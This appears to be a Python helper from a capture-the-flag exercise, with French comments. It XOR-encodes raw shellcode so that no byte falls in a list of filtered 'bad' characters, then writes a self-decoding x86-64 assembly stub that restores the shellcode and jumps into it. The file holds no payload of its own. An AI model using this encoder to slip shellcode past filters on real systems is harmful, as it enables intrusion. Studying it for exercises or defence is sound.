#!/usr/bin/env python3
import struct

def find_xor_bytes(b):
    """Trouve deux bytes qui XORés donnent b, sans bad chars"""
    for i in range(256):
        if i not in badchars:
            if b ^ i not in badchars:
                return i, b ^ i
    print(f"Cannot find proper byte for {hex(b)}")
    exit(-1)

# Bad chars du level 5
badchars = [0x0, 0xa, 0xd, 0x2f, 0xff, 0xf, 0x5, 0x68]
# Ajouter 0x40 à 0x65
for i in range(0x40, 0x66):
    badchars.append(i)
# Paranoia: ajouter 0x01 à 0x0e
for i in range(0x1, 0xf):
    badchars.append(i)

# Lire le shellcode à encoder
with open('shellcode', 'rb') as sc:
    data = sc.read()

# Padder à un multiple de 4
while len(data) % 4:
    data += b'\xc3'  # ret comme padding

storage = b''
encoded_bytes = b''
commands = ''
defines = ''
num_commands = 0

# Encoder chaque byte
for b in data:
    (b1, b2) = find_xor_bytes(b)
    storage += bytes([b1])
    encoded_bytes += bytes([b2])
    
    # Tous les 4 bytes, créer une instruction XOR
    if len(storage) == 4:
        storage_val = struct.unpack('<I', storage)[0]
        encoded_val = struct.unpack('<I', encoded_bytes)[0]
        
        commands += f"xor dword [rax+_shellcode{num_commands}-_shellcode], {hex(storage_val)}\n"
        defines += f"_shellcode{num_commands} dd {hex(encoded_val)}\n"
        
        storage = b''
        encoded_bytes = b''
        num_commands += 1

# Générer le fichier assembleur final
output = """bits 64
_start:

_shellcode:
jmp _decoder
nop
nop
"""
output += defines
output += "\n_decoder:\n"
output += commands
output += "jmp _shellcode0\n"

# Écrire dans un fichier
with open('final.asm', 'w') as f:
    f.write(output)

print("✅ Fichier final.asm généré !")